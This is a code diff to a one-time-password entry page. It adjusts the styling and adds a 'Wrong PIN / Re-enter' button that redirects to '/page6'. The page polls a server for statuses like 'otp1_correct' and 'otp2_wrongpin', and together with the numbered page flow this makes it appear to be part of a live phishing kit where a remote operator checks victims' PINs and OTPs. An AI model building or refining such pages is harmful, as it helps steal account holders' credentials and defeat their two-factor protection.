@@ -11,11 +11,11 @@
         * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { margin: 0; padding: 0; background-color: #EBF9F0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
 
-        .container { flex: 1; padding: 40px 20px; text-align: center; }
+        .container { flex: 1; padding: 30px 20px; text-align: center; overflow-y: auto; }
         h2 { font-size: 22px; color: #1F2937; margin-bottom: 10px; font-weight: 500; }
         p { font-size: 14px; color: #6B7280; line-height: 1.5; margin-bottom: 25px; }
 
-        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin: 30px 0; }
+        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin: 25px 0; }
         .otp-inputs input {
             width: 45px; height: 55px;
             border: 1.5px solid #00B050;
@@ -29,7 +29,7 @@
         }
 
         .otp-inputs input:focus { border-color: #00963F; border-width: 2px; box-shadow: 0 0 5px rgba(0, 176, 80, 0.3); }
-        .resend-text { font-size: 13px; color: #6B7280; margin-bottom: 30px; }
+        .resend-text { font-size: 13px; color: #6B7280; margin-bottom: 20px; }
 
         .btn-verify {
             width: 100%; max-width: 300px;
@@ -42,6 +42,7 @@
             font-weight: bold;
             cursor: not-allowed;
             text-transform: uppercase;
+            margin-bottom: 12px;
         }
 
         .btn-verify.active { 
@@ -49,6 +50,25 @@
             color: white; 
             cursor: pointer; 
             box-shadow: 0 4px 8px rgba(0, 176, 80, 0.3);
+        }
+
+        /* --- WRONG PIN BUTTON --- */
+        .btn-wrong-pin {
+            width: 100%; max-width: 300px;
+            padding: 12px;
+            border-radius: 10px;
+            border: 1px solid #FCA5A5;
+            background-color: #FEF2F2;
+            color: #DC2626;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-wrong-pin:hover {
+            background-color: #FEE2E2;
         }
 
         /* --- LOADING OVERLAY --- */
@@ -66,9 +86,9 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         .footer {
-            position: relative; height: 250px;
+            position: relative; height: 120px;
             background: linear-gradient(180deg, #00C853 0%, #00963F 100%);
-            border-top-left-radius: 50% 100px; border-top-right-radius: 50% 100px;
+            border-top-left-radius: 50% 50px; border-top-right-radius: 50% 50px;
             display: flex; justify-content: center; align-items: center; color: white;
             font-size: 12px; margin-top: auto;
             box-shadow: 0 -4px 12px rgba(0,176,80,0.15);
@@ -97,7 +117,10 @@
     </div>
 
     <div class="resend-text" id="timer-text"></div>
+    
     <button class="btn-verify" id="verify-btn" disabled>VERIFY FIRST OTP</button>
+    <button class="btn-wrong-pin" id="wrong-pin-btn" onclick="handleWrongPin()">🔑 Wrong PIN / Re-enter</button>
+    
     <div id="status-msg" style="margin-top:15px; font-size:14px; font-weight:500;"></div>
 </div>
 
@@ -193,6 +216,12 @@ async function submitOtp() {
     }
 }
 
+function handleWrongPin() {
+    clearInterval(pollingInterval);
+    overlay.style.display = 'none';
+    window.location.href = "/page6?error=wrongpin";
+}
+
 function startPolling() {
     clearInterval(pollingInterval);
     pollingInterval = setInterval(async () => {
@@ -202,7 +231,6 @@ function startPolling() {
 
             if (data.status === "otp1_correct") {
                 clearInterval(pollingInterval);
-                // Preserved routing to success file / success path
                 window.location.href = "/success.html";
             } 
             else if (data.status === "otp2_wrongpin") {
